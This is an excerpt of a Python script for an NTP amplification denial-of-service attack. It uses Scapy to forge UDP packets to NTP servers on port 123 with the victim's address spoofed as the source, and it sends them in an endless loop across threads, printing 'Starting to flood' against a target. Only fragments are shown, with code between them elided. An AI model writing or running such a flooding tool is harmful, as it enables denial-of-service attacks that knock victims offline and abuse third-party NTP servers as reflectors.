...
def deny():
    ...
    packet = IP(dst=ntpserver, src=target) / UDP(sport=27015,
                                                 dport=123) / Raw(load=data)
    # BUILD IT
    send(packet, loop=1)
...
def printhelp():
    ...
    print("MAKE SURE "
          "YOUR THREAD COUNT IS LESS THAN "
          "OR EQUAL TO YOUR NUMBER OF SERVERS")
    exit(0)
...
try:
    ...
    print("Starting to flood: " + target + " using NTP list: " +
          ntpserverfile + " With " + str(numberthreads) + " threads")
